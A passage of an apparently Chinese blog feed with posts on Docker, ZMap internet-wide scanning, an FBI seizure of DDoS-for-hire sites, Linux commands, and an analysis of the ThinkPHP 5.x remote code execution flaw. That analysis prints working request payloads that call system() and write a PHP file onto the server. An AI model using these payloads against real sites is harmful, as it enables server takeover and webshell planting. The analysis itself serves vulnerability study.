href="#浏览器测试访问-http-localhost-88" class="headerlink" title="浏览器测试访问 http://localhost:88"></a>浏览器测试访问 <a href="http://localhost:88" target="_blank" rel="noopener">http://localhost:88</a></h4><p><img src="http://yun.name168.cn/docker_php-1.png" alt="&quot;部署成功&quot;"></p><p>这里的db 是mysql的别名可以使用一下命令查看</p><blockquote><p>docker exec lnmp_web cat /etc/hosts</p></blockquote><p><img src="http://yun.name168.cn/docker_php-2.png" alt="&quot;mysql别名&quot;"></p><p>可以看到这里是db 所以数据库主机填db  填localhost会报错的哦 </p><p>PS:我用的是VPS测试的  非虚拟机  个别目录需要根据自己定义的选择  在这里我都是默认的</p><h4 id="部署成功"><a href="#部署成功" class="headerlink" title="部署成功"></a>部署成功</h4><p><img src="http://yun.name168.cn/docker_php-3.png" alt="&quot;搭建成功&quot;"></p><p>PS:大牛勿喷  博主只是一个入门小白</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;​    最近学Docker又入迷了:see_no_evil:那么来记录下wordpress搭建过程吧&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://yun.name168.cn/Docker.jpg&quot; alt=&quot;&amp;quot;Docker部署&amp;quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Docker" scheme="https://www.5658.pw/categories/Docker/"/>
    
    
      <category term="linux" scheme="https://www.5658.pw/tags/linux/"/>
    
      <category term="搭建" scheme="https://www.5658.pw/tags/%E6%90%AD%E5%BB%BA/"/>
    
      <category term="Docker" scheme="https://www.5658.pw/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>ZMap安装与使用</title>
    <link href="https://www.5658.pw/2018/12/23/zmap%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <id>https://www.5658.pw/2018/12/23/zmap安装与使用/</id>
    <published>2018-12-23T11:34:26.000Z</published>
    <updated>2018-12-27T11:31:20.298Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="ZMap简介"><a href="#ZMap简介" class="headerlink" title="ZMap简介"></a>ZMap简介</h3><p>​    ZMap, 一个网络端口开放性的快速:zap:扫描工具。由密歇根大学研究人员组成的一个团队在2015年3月27日召开的Usenix国际安全研讨会上，宣布推出了一种名为”ZMap”的工具，这种工具能令一台普通的服务器在短短44分钟时间里扫描<a href="https://baike.so.com/doc/2011565-2128705.html" target="_blank" rel="noopener">互联网</a>上的每一个地址。Durumeric及其同事在2013年末开发了ZMap。在此之前，用软件扫描互联网需要耗时数周或数月，当时的工具比ZMap慢1000倍。</p><a id="more"></a><p>传言它能45分钟扫描整个网络，也就是世界IP段子。条件:只要上行带宽满足的情况下(我想应该是5个10Gb/s的带宽插到一个服务器上)</p><h3 id="ZMap安装"><a href="#ZMap安装" class="headerlink" title="ZMap安装"></a>ZMap安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yum install cmake gmp gmp-devel libpcap-devel gengetopt byacc flex</span><br><span class="line">wget https://github.com/zmap/zmap/archive/v1.2.0.tar.gz</span><br><span class="line">或者git clone https://github.com/zmap/zmap.git    cd zmap</span><br><span class="line">tar -xvf v1.2.0.tar.gz</span><br><span class="line">cd zmap-1.2.0</span><br><span class="line">cmake -DENABLE_HARDENING=ON</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>PS:如果无法下载,就用VPN</p><h3 id="ZMap使用"><a href="#ZMap使用" class="headerlink" title="ZMap使用"></a>ZMap使用</h3><p><strong>①扫世界段子(我经常用的)</strong></p><blockquote><p>zmap -p &lt;端口&gt; -o result.txt</p></blockquote><p>-p 是要扫描的端口  例如扫描开放9002端口的主机 就是zmap -p 9002 -o result.txt</p><p>-o 是把扫描的结果输出到文本中</p><p><img src="http://yun.name168.cn/CentOS%206%2064%20%E4%BD%8D-2018-12-23-19-54-10.png" alt="&quot;zmap扫描&quot;"></p><p>PS:  官方文档<a href="https://github.com/zmap/zmap" target="_blank" rel="noopener">https://github.com/zmap/zmap</a></p><p>​    官网<a href="https://zmap.io/" target="_blank" rel="noopener">https://zmap.io</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;ZMap简介&quot;&gt;&lt;a href=&quot;#ZMap简介&quot; class=&quot;headerlink&quot; title=&quot;ZMap简介&quot;&gt;&lt;/a&gt;ZMap简介&lt;/h3&gt;&lt;p&gt;​    ZMap, 一个网络端口开放性的快速:zap:扫描工具。由密歇根大学研究人员组成的一个团队在2015年3月27日召开的Usenix国际安全研讨会上，宣布推出了一种名为”ZMap”的工具，这种工具能令一台普通的服务器在短短44分钟时间里扫描&lt;a href=&quot;https://baike.so.com/doc/2011565-2128705.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;互联网&lt;/a&gt;上的每一个地址。Durumeric及其同事在2013年末开发了ZMap。在此之前，用软件扫描互联网需要耗时数周或数月，当时的工具比ZMap慢1000倍。&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://www.5658.pw/categories/Linux/"/>
    
    
      <category term="扫描器" scheme="https://www.5658.pw/tags/%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    
      <category term="Internet" scheme="https://www.5658.pw/tags/Internet/"/>
    
  </entry>
  
  <entry>
    <title>联邦调查局查获15个DDoS-For-Hire网站</title>
    <link href="https://www.5658.pw/2018/12/20/%E8%81%94%E9%82%A6%E8%B0%83%E6%9F%A5%E5%B1%80%E6%9F%A5%E8%8E%B715%E4%B8%AADDoS-For-Hire%E7%BD%91%E7%AB%99/"/>
    <id>https://www.5658.pw/2018/12/20/联邦调查局查获15个DDoS-For-Hire网站/</id>
    <published>2018-12-20T11:13:31.000Z</published>
    <updated>2019-01-01T09:31:49.119Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="http://yun.name168.cn/ddos-for-hire-fbi-domain-seized.jpg" alt="&quot;DDos&quot;"></p><p> FBI刚刚救了圣诞节。<br><a id="more"></a><br>美国司法部今天早些时候宣布，FBI已经占领了15个“DDoS-for-hire”网站，并指控三个人运营其中一些服务。</p><p><a href="https://thehackernews.com/2017/07/ddoS-for-hire-service-hack.html" target="_blank" rel="noopener">DDoS-for-hire</a>，或“Booter”或“Stresser”服务租用对受感染设备网络的访问，然后任何人，即使是最不懂技术的人，也可以使用它来启动分布式拒绝服务（DDoS）攻击任何网站并破坏其访问权限。  </p><p>近年来，多个黑客组织通过使用大规模DDoS攻击取消<a href="https://thehackernews.com/2015/01/second-uk-man-arrested-for-hacking-playstation-xbox.html" target="_blank" rel="noopener">PlayStation，Xbox网络</a>和其他游戏服务器<a href="https://thehackernews.com/2015/01/second-uk-man-arrested-for-hacking-playstation-xbox.html" target="_blank" rel="noopener">，</a><a href="https://thehackernews.com/2015/01/two-lizard-squad-hackers-arrested-after.html" target="_blank" rel="noopener">破坏</a>了数百万玩家的<a href="https://thehackernews.com/2015/01/two-lizard-squad-hackers-arrested-after.html" target="_blank" rel="noopener">圣诞节</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">“这项行动中提到的引导服务涉嫌袭击美国和海外的各种受害者，包括金融机构，大学，互联网服务提供商，政府系统和各种游戏平台，”美国司法部说。</span><br><span class="line">“针对DDoS服务的行动发生在圣诞假期前一周，这个历史上一直困扰着游戏世界中多产的DDoS攻击。”</span><br></pre></td></tr></table></figure><p>今年4月，荷兰警方取消了<a href="https://thehackernews.com/2018/04/ddos-for-hire-hacker.html" target="_blank" rel="noopener">世界上最大的DDoS-for-hire服务，</a>称为++Webstresser++，帮助网络罪犯发动超过400万次攻击，并逮捕了其管理员。</p><p>在网络压力测试服务的幌子下销售访问DDoS攻击并在周四被联邦调查局<a href="https://www.justice.gov/opa/pr/criminal-charges-filed-los-angeles-and-alaska-conjunction-seizures-15-websites-offering-ddos" target="_blank" rel="noopener">抓获</a>的15个引导域包括：</p><ul><li>critical-boot.com</li><li>ragebooter.com</li><li>anonsecurityteam.com</li><li>downthem.org</li><li>quantumstress.net</li><li>booter.ninja</li><li>bullstresser.net</li><li>defcon.pro</li><li>str3ssed.me</li><li>defianceprotocol.com</li><li>layer7-stresser.xyz</li><li>netstress.org</li><li>request.rip</li><li>torsecurityteam.org</li><li>Vbooter.org</li></ul><p>据称， 这些<a href="https://thehackernews.com/2016/11/titanium-stresser-ddos-tool.html" target="_blank" rel="noopener">DDoS-for-Hire服务</a>用于针对美国和国外的各种受害者，包括金融机构，大学，互联网服务提供商，政府系统和各种游戏平台。</p><p>  12月12日，美国检察官办公室还<a href="https://www.justice.gov/usao-ak/pr/criminal-charges-filed-alaska-conjunction-seizure-websites-offering-ddos-hire-services" target="_blank" rel="noopener">指控</a> 宾夕法尼亚州23岁的++大卫·布科斯基++（++David Bukoski）++在2012 年11月29日开始运营++Quantum++ ++Stresser++，这是运营时间最长的DDoS服务之一，截至11月29日已有超过80,000个客户订阅。</p><p>2018年仅此一项，Quantum Stresser就被用于针对全球受害者（包括阿拉斯加和加利福尼亚州）发起超过50,000次“实际或未遂”的DDoS攻击。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">美国检察官布莱恩施罗德说：“像这样的租赁服务的DDoS构成了重大的国家威胁。” “这些协调调查和起诉证明了跨区域合作和与公共部门合作伙伴协调的重要性。”</span><br></pre></td></tr></table></figure><p> 除了缉获15个引导服务外，联邦调查局还对两名涉嫌网络犯罪分子 - 30岁的马修加特雷和25岁的胡安马丁内斯提起刑事诉讼 - 据称他们与被称为“Downthem”的DDoS租用服务有关联。 Ampnode“。</p><p>据FBI称，2014年10月至2018年11月期间，Downthem拥有超过2000个客户订阅，并已被用于“进行或试图进行超过200,000次DDoS攻击”。</p><p>最近的镇压服务器不仅向其他潜在的DDoS小贩提供警告，而且还向出租这些服务的用户发出警告，因为联邦调查局警告说，它将寻求起诉任何支付此类服务的人。  </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://yun.name168.cn/ddos-for-hire-fbi-domain-seized.jpg&quot; alt=&quot;&amp;quot;DDos&amp;quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt; FBI刚刚救了圣诞节。&lt;br&gt;
    
    </summary>
    
      <category term="DDos" scheme="https://www.5658.pw/categories/DDos/"/>
    
    
      <category term="DDos" scheme="https://www.5658.pw/tags/DDos/"/>
    
      <category term="网络压力测试" scheme="https://www.5658.pw/tags/%E7%BD%91%E7%BB%9C%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/"/>
    
      <category term="僵尸网络" scheme="https://www.5658.pw/tags/%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/"/>
    
      <category term="Booter" scheme="https://www.5658.pw/tags/Booter/"/>
    
      <category term="Stresser" scheme="https://www.5658.pw/tags/Stresser/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5.x 前台getshell分析</title>
    <link href="https://www.5658.pw/2018/12/11/ThinkPHP5-x-%E5%89%8D%E5%8F%B0getshell%E5%88%86%E6%9E%90/"/>
    <id>https://www.5658.pw/2018/12/11/ThinkPHP5-x-前台getshell分析/</id>
    <published>2018-12-11T04:27:51.000Z</published>
    <updated>2019-05-11T05:44:28.232Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>昨晚微博刷着刷着看到一个无条件的ThinkPHP5.x通杀前台getshell，然后群里面师傅们也都在讨论这件事了。感觉是个TP5写的站都是通杀，怕是一场腥风血雨。。。</p><p>官方给出的补丁，可以看到是路由上面出的问题，怪不得通杀。</p><p><img src="http://yun.name168.cn/ThinkPHP5.png" alt="&quot;ThinkPHP5.x 前台getshell分析&quot;"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>分析版本 ThinkPHP 5.1.30</p><a id="more"></a><h2 id="路由调用"><a href="#路由调用" class="headerlink" title="路由调用"></a>路由调用</h2><p>先从<code>thinkphp/library/think/route/dispatch/Url.php:20</code>看起</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function init()</span><br><span class="line">&#123;</span><br><span class="line">    // 解析默认的URL规则</span><br><span class="line">    $result = $this-&gt;parseUrl($this-&gt;dispatch);</span><br><span class="line">    return (new Module($this-&gt;request, $this-&gt;rule, $result))-&gt;init();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>init</code>中进行了url解析然后将返回值赋值给<code>$result</code>，然后再传入到<code>Module</code>的<code>init()</code>中。</p><p>先来到解析url的部分，可以一直跟进到<code>thinkphp/library/think/route/Rule.php:947</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public function parseUrlPath($url)</span><br><span class="line">&#123;</span><br><span class="line">    // 分隔符替换 确保路由定义使用统一的分隔符</span><br><span class="line">    $url = str_replace(&apos;|&apos;, &apos;/&apos;, $url);</span><br><span class="line">    $url = trim($url, &apos;/&apos;);</span><br><span class="line">    $var = [];</span><br><span class="line"></span><br><span class="line">    if (false !== strpos($url, &apos;?&apos;)) &#123;</span><br><span class="line">        // [模块/控制器/操作?]参数1=值1&amp;参数2=值2...</span><br><span class="line">        $info = parse_url($url);</span><br><span class="line">        $path = explode(&apos;/&apos;, $info[&apos;path&apos;]);</span><br><span class="line">        parse_str($info[&apos;query&apos;], $var);</span><br><span class="line">    &#125; elseif (strpos($url, &apos;/&apos;)) &#123;</span><br><span class="line">        // [模块/控制器/操作]</span><br><span class="line">        $path = explode(&apos;/&apos;, $url);</span><br><span class="line">    &#125; elseif (false !== strpos($url, &apos;=&apos;)) &#123;</span><br><span class="line">        // 参数1=值1&amp;参数2=值2...</span><br><span class="line">        $path = [];</span><br><span class="line">        parse_str($url, $var);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $path = [$url];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return [$path, $var];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到是单纯的根据<code>/</code>来进行分割，也就意味着其中可以插入一些自定义的字符。</p><p>最后返回一个这样的<code>[$module, $controller, $action]</code>数组</p><p><img src="http://yun.name168.cn/ThinkPHP51.png" alt="&quot;ThinkPHP5.x 前台getshell分析&quot;"></p><p>在<code>Module</code>初始化的时候，就会将<code>$result</code>数组赋值到<code>$this-&gt;dispatch</code>变量中</p><p>然后来到<code>Module</code>的<code>init()</code>方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">thinkphp/library/think/route/dispatch/Module.php:27</span><br><span class="line">public function init()</span><br><span class="line">&#123;</span><br><span class="line">    parent::init();</span><br><span class="line"></span><br><span class="line">    $result = $this-&gt;dispatch;</span><br><span class="line"></span><br><span class="line">    if (is_string($result)) &#123;</span><br><span class="line">        $result = explode(&apos;/&apos;, $result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line">    // 是否自动转换控制器和操作名</span><br><span class="line">    $convert = is_bool($this-&gt;convert) ? $this-&gt;convert : $this-&gt;rule-&gt;getConfig(&apos;url_convert&apos;);</span><br><span class="line">    // 获取控制器名</span><br><span class="line">    $controller       = strip_tags($result[1] ?: $this-&gt;rule-&gt;getConfig(&apos;default_controller&apos;));</span><br><span class="line">    $this-&gt;controller = $convert ? strtolower($controller) : $controller;</span><br><span class="line"></span><br><span class="line">    // 获取操作名</span><br><span class="line">    $this-&gt;actionName = strip_tags($result[2] ?: $this-&gt;rule-&gt;getConfig(&apos;default_action&apos;));</span><br><span class="line"></span><br><span class="line">    // 设置当前请求的控制器、操作</span><br><span class="line">    $this-&gt;request</span><br><span class="line">        -&gt;setController(Loader::parseName($this-&gt;controller, 1))</span><br><span class="line">        -&gt;setAction($this-&gt;actionName);</span><br><span class="line"></span><br><span class="line">    return $this;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>$this-&gt;controller</code>和<code>$this-&gt;actionName</code>是从变量<code>$result</code>值而来的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$controller       = strip_tags($result[1] ?: $this-&gt;rule-&gt;getConfig(&apos;default_controller&apos;));</span><br><span class="line">$this-&gt;controller = $convert ? strtolower($controller) : $controller;</span><br><span class="line">$this-&gt;actionName = strip_tags($result[2] ?: $this-&gt;rule-&gt;getConfig(&apos;default_action&apos;));</span><br></pre></td></tr></table></figure><p>而这<code>$result</code>的值是由<code>$this-&gt;dispatch</code>的值而来的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result = $this-&gt;dispatch;</span><br></pre></td></tr></table></figure><p>到了这里，漏洞也就差不多出来了，由于获取<code>$controller</code>和<code>$action</code>时没有进行什么检验，后面就是常规的调用类触发方法。</p><p>导致可以调用任意类的任意方法。只要找到几个存在危险函数调用的地方，就可以深度利用这个漏洞。</p><h2 id="寻找触发点"><a href="#寻找触发点" class="headerlink" title="寻找触发点"></a>寻找触发点</h2><p>触发点似乎有蛮多的，就挑几个说一下</p><h3 id="think-Container-invokefunction"><a href="#think-Container-invokefunction" class="headerlink" title="\think\Container invokefunction"></a>\think\Container invokefunction</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">thinkphp/library/think/Container.php:340</span><br><span class="line">public function invokeFunction($function, $vars = [])</span><br><span class="line">&#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        $reflect = new ReflectionFunction($function);</span><br><span class="line">        $args = $this-&gt;bindParams($reflect, $vars);</span><br><span class="line">        return call_user_func_array($function, $args);</span><br><span class="line">    &#125; catch (ReflectionException $e) &#123;</span><br><span class="line">        throw new Exception(&apos;function not exists: &apos; . $function . &apos;()&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以直接看到<code>call_user_func_array</code>的调用，传入对应的<code>$function</code>和<code>$var</code>即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s=index/\think\Container/invokefunction</span><br><span class="line">&amp;function=call_user_func_array</span><br><span class="line">&amp;vars[0]=system</span><br><span class="line">&amp;vars[1][]=dir</span><br></pre></td></tr></table></figure><h3 id="think-template-driver-File-write"><a href="#think-template-driver-File-write" class="headerlink" title="\think\template\driver\File write"></a>\think\template\driver\File write</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">thinkphp/library/think/template/driver/File.php:27</span><br><span class="line">public function write($cacheFile, $content)</span><br><span class="line">&#123;</span><br><span class="line">    // 检测模板目录</span><br><span class="line">    $dir = dirname($cacheFile);</span><br><span class="line"></span><br><span class="line">    if (!is_dir($dir)) &#123;</span><br><span class="line">        mkdir($dir, 0755, true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 生成模板缓存文件</span><br><span class="line">    if (false === file_put_contents($cacheFile, $content)) &#123;</span><br><span class="line">        throw new Exception(&apos;cache write error:&apos; . $cacheFile, 11602);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">s=index/\think\template\driver\File/write</span><br><span class="line">&amp;cacheFile=1.php</span><br><span class="line">&amp;content=&lt;?=phpinfo();</span><br></pre></td></tr></table></figure><p>就会生成一个<code>1.php</code>的文件</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>可以调用的类还是相当多的，今天网上一搜，好多站都已经是马场了，惨惨惨。。。</p><p>后来知道5.0和5.1以及linux和win有点差异，放一个通用的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">?s=index/\think\app/invokefunction</span><br><span class="line">&amp;function=call_user_func_array</span><br><span class="line">&amp;vars[0]=system</span><br><span class="line">&amp;vars[1][]=dir</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;昨晚微博刷着刷着看到一个无条件的ThinkPHP5.x通杀前台getshell，然后群里面师傅们也都在讨论这件事了。感觉是个TP5写的站都是通杀，怕是一场腥风血雨。。。&lt;/p&gt;
&lt;p&gt;官方给出的补丁，可以看到是路由上面出的问题，怪不得通杀。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://yun.name168.cn/ThinkPHP5.png&quot; alt=&quot;&amp;quot;ThinkPHP5.x 前台getshell分析&amp;quot;&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;漏洞分析&quot;&gt;&lt;/a&gt;漏洞分析&lt;/h1&gt;&lt;p&gt;分析版本 ThinkPHP 5.1.30&lt;/p&gt;
    
    </summary>
    
      <category term="Getshell" scheme="https://www.5658.pw/categories/Getshell/"/>
    
    
      <category term="PHP" scheme="https://www.5658.pw/tags/PHP/"/>
    
      <category term="ThinkPHP5" scheme="https://www.5658.pw/tags/ThinkPHP5/"/>
    
      <category term="getshell" scheme="https://www.5658.pw/tags/getshell/"/>
    
  </entry>
  
  <entry>
    <title>自己用到的部分linux命令</title>
    <link href="https://www.5658.pw/2018/12/10/%E8%87%AA%E5%B7%B1%E5%B8%B8%E7%94%A8%E7%9A%84%E9%83%A8%E5%88%86linux%E5%91%BD%E4%BB%A4/"/>
    <id>https://www.5658.pw/2018/12/10/自己常用的部分linux命令/</id>
    <published>2018-12-10T12:36:26.000Z</published>
    <updated>2018-12-27T11:31:33.563Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><p><strong>①Centos 测速</strong></p><blockquote><p>wget <a href="http://yun.name168.cn/speed.py" target="_blank" rel="noopener">http://yun.name168.cn/speed.py</a></p></blockquote><blockquote><p>python speed.py</p></blockquote><p><strong>②文件拖拽</strong></p><blockquote><p>yum install -y lrzsz</p></blockquote><p><strong>③安装java</strong></p><a id="more"></a><blockquote><p>yum install -y java</p></blockquote><blockquote><p>yum -y list java*                            # 查看</p></blockquote><blockquote><p>yum search java | grep -i –color JDK </p></blockquote><blockquote><p>yum -y remove java-1.8.0-openjdk*        # 移除</p></blockquote><blockquote><p>yum -y install java-1.8.0-openjdk*        # 安装</p></blockquote><p><strong>A.手动下载配置</strong></p><p>1、复制安装包到/usr/java目录中(目录可以自己选)：cp jdk-11.0.1_linux-x64_bin.tar.gz  /usr/java/</p><p>2、切换到/usr/java目录下：cd /usr/java/</p><p>3、解压缩包：tar -zxvf jdk-11.0.1_linux-x64_bin.tar.gz</p><p>4、配置环境变量，使用vim /etc/profile 编辑profile文件 输入： vim /etc/profile，向文件里面追加以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#set java environment</span><br><span class="line"></span><br><span class="line">JAVA_HOME=/usr/java/jdk-11.0.1</span><br><span class="line"></span><br><span class="line">JRE_HOME=$JAVA_HOME/jre</span><br><span class="line"></span><br><span class="line">PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin</span><br><span class="line"></span><br><span class="line">CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib</span><br><span class="line"></span><br><span class="line">export JAVA_HOME JRE_HOME PATH CLASSPATH</span><br></pre></td></tr></table></figure><p>PS: oracle官网地址:<a href="https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</a></p><h3 id="CentOS7使用firewalld打开关闭防火墙与端口"><a href="#CentOS7使用firewalld打开关闭防火墙与端口" class="headerlink" title="CentOS7使用firewalld打开关闭防火墙与端口"></a>CentOS7使用firewalld打开关闭防火墙与端口</h3><p><strong>① firewalld的基本使用</strong></p><ul><li>启动： systemctl start firewalld</li><li>关闭： systemctl stop firewalld</li><li>查看状态： systemctl status firewalld </li><li>开机禁用  ： systemctl disable firewalld</li><li>开机启用  ： systemctl enable firewalld</li></ul><p><strong>② systemctl服务管理</strong></p><ul><li>启动一个服务：systemctl start firewalld.service</li><li>关闭一个服务：systemctl stop firewalld.service</li><li>重启一个服务：systemctl restart firewalld.service</li><li>显示一个服务的状态：systemctl status firewalld.service</li><li>在开机时启用一个服务：systemctl enable firewalld.service</li><li>在开机时禁用一个服务：systemctl disable firewalld.service</li><li>查看服务是否开机启动：systemctl is-enabled firewalld.service</li><li>查看已启动的服务列表：systemctl list-unit-files|grep enabled</li><li>查看启动失败的服务列表：systemctl –failed</li></ul><p><strong>③ 配置firewalld-cmd</strong></p><ul><li>查看版本： firewall-cmd –version</li><li>查看帮助： firewall-cmd –help</li><li>显示状态： firewall-cmd –state</li><li>查看所有打开的端口： firewall-cmd –zone=public –list-ports</li><li>更新防火墙规则： firewall-cmd –reload</li><li>查看区域信息:  firewall-cmd –get-active-zones</li><li>查看指定接口所属区域： firewall-cmd –get-zone-of-interface=eth0</li><li>拒绝所有包：firewall-cmd –panic-on</li><li>取消拒绝状态： firewall-cmd –panic-off</li><li>查看是否拒绝： firewall-cmd –query-panic</li></ul><p><strong>④端口管理</strong></p><ul><li>添加</li></ul><blockquote><p>firewall-cmd –zone=public –add-port=80/tcp –permanent    (–permanent永久生效，没有此参数重启后失效）</p></blockquote><ul><li>重新载入</li></ul><blockquote><p>firewall-cmd –reload</p></blockquote><ul><li>查看</li></ul><blockquote><p>firewall-cmd –zone= public –query-port=80/tcp</p></blockquote><ul><li>删除</li></ul><blockquote><p>firewall-cmd –zone= public –remove-port=80/tcp –permanent</p></blockquote><h3 id="Centos6-6系统汉化"><a href="#Centos6-6系统汉化" class="headerlink" title="Centos6.6系统汉化"></a>Centos6.6系统汉化</h3><p>编辑i18n配置文件: vi /etc/sysconfig/i18n</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">进行如下配置并保存退出：</span><br><span 